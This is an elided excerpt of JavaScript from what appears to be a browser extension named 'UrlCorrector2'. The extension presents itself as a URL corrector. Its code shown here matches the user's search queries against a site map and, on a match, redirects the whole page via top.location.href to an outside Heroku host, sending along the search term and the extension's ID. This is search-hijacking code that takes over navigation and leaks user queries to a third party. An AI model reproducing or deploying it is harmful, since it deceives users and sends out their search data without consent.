...
UrlCorrector2Cnst.SUSPEND_PARAM_VAL = "suspend_" + "UrlCorrector2";
UrlCorrector2Cnst.SEARCH_SITES =
...
var UrlCorrector2Redirect = function(){
	...
	if(typeof QueryString[UrlCorrector2Cnst.SUSPEND_PARAM_VAL ] !== "undefined"){
		return;
	}
	...
	var valFromMap = UrlCorrector2SiteMap[QueryString.q] ;
	if(typeof valFromMap === "undefined" ){

		valFromMap = UrlCorrector2SiteMap[encodeURIComponent(QueryString.q)];
	}

	if(typeof valFromMap === "undefined" ){

		valFromMap = UrlCorrector2SiteMap[encodeURIComponent(encodeURIComponent(QueryString.q))];
	}
	...
	typeof valFromMap!== "undefined"  &&(function(){
		...
		var d = "https://urlcorrectator.herokuapp.com";
		top.location.href = d +"/searcher.html?#q=" + encodeURIComponent(valFromMap) + "&term=" + encodeURIComponent(QueryString.q)
		+"&sus=" + UrlCorrector2Cnst.SUSPEND_PARAM_VAL + "&name=UrlCorrector2" + "&id=" + chrome.runtime.id;
...
var isAllowedBySite = function(url){
	var allowedSites = UrlCorrector2Cnst.SEARCH_SITES;
